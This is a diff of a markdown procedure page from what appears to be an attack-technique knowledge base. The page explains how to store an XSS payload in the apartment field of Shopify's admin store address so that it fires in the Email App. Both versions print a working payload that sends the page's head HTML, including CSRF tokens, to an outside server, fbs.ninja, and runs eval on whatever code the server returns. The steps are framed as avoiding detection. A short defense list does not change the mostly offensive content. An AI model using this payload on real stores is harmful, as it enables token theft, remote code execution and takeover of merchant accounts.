@@ -1,28 +1,28 @@
 ---
-id: proc-inject-xss-store-address
 tags:
   - xss
   - stored-xss
   - payload-injection
-  - shopify
 type: procedure
 tools: []
 tactics:
   - '[[Execution]]'
-commands: []
-verified: false
+commands:
+  - '[[commands/shopify-xss-payload-injection]]'
 platforms:
   - Web
-submitted: true
-created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-13T23:52:43.980Z'
 skill_level: intermediate
-impact_level: high
+impact_level: medium
 detection_risk: medium
 sub_techniques: []
+id: a0241b59-fa21-42f7-b798-b0c7fc695906
+created_at: '2025-12-14T17:30:18.195Z'
+updated_at: '2025-12-14T17:30:18.195Z'
+verified: false
 validated: true
+submitted: true
 mitre_tactics:
   - '[[Execution]]'
 mitre_techniques:
@@ -32,61 +32,55 @@ mitre_techniques:
 
 ## Summary
 
-This procedure injects a stored XSS payload into the 'Apartment, suite, etc. (optional)' field in Shopify's store address settings, bypassing character limits and persisting malicious code for later execution.
+This procedure injects a malicious HTML/JavaScript payload into the 'Apartment, suite, etc. (optional)' field in Shopify's admin store address settings, exploiting lack of sanitization to store XSS for later execution in the Email App.
 
 ## Description
 
-The vulnerability stems from lack of HTML escaping when the store address is rendered in the Shopify Email App. The payload uses a delayed onerror handler on an invalid image src to exfiltrate document.head.innerHTML via postMessage and an XMLHttpRequest to an external server, enabling CSRF token theft.
+The vulnerability stems from insufficient input validation in the store address field. The compact payload uses an invalid <img> src to trigger onerror, employing setTimeout for delayed execution and XMLHttpRequest to exfiltrate document.head.innerHTML via postMessage to an external server. This bypasses the 255-character limit and enables CSRF token theft upon rendering.
 
 ## Requirements
 
-1. Access to Shopify admin settings general page
-2. Web browser developer tools for payload testing
-3. External server (e.g., https://fbs.ninja) to receive exfiltrated data
+1. Access to Shopify admin settings (from prior procedure).
+2. External server endpoint (e.g., https://fbs.ninja) to receive data.
+3. Browser for manual injection.
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Sanitize and escape all user inputs in address fields using HTML entity encoding
-- Implement content security policy (CSP) to block inline scripts and external postMessages
-- Log and alert on suspicious payloads in settings changes
+- Sanitize and escape HTML in all stored inputs.
+- Use Content Security Policy (CSP) to block inline scripts.
+- Log and review admin setting changes.
 
 ## Objectives
 
-1. Store executable JavaScript without immediate detection
-2. Bypass 255-character limit with compact payload
-3. Enable delayed exfiltration upon rendering
+1. Store malicious payload without detection.
+2. Ensure payload survives storage and retrieval.
+3. Set up for delayed exfiltration.
 
 ## Instructions
 
 ### Step 1: Locate the Vulnerable Field
 
-**Context**: Identify the optional address input for payload placement.
+**Context**: Identify the optional apartment field in the address section.
 
-Scroll to the Store address section and focus on 'Apartment, suite, etc. (optional)'.
+**Command** (Manual Browser Action):
 
-> Expected: Field is editable and accepts HTML input.
+Scroll to Store address > Apartment, suite, etc. (optional).
 
-### Step 2: Insert the Payload
+> Expected output: Text input field appears, ready for entry.
 
-**Context**: Craft and inject the malicious HTML to trigger on error.
+### Step 2: Inject the Payload
 
-Paste the following payload into the field:
+**Context**: Enter the XSS payload to trigger on render.
+
+**Command** ([[commands/shopify-xss-payload-injection]]):
 
 ```html
-<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText),2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/> 
+<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/> 
 ```
 
-> Explanation: The onerror handler sets a timeout, creates a function to POST head HTML to the external server, and uses postMessage for cross-context communication. Delays prevent immediate detection.
-
-### Step 3: Save Settings
-
-**Context**: Persist the payload in the backend.
-
-Click Save to update the store address.
-
-> Expected: Confirmation message; no validation errors.
+> Paste into the field and save. Expected output: Settings update without errors; payload stored.
 
 ## MITRE ATT&CK Mapping
 
@@ -103,6 +97,7 @@ Click Save to update the store address.
 
 ## Commands Used
 
+- [[commands/shopify-xss-payload-injection]]
 
 ## Tools Used
 
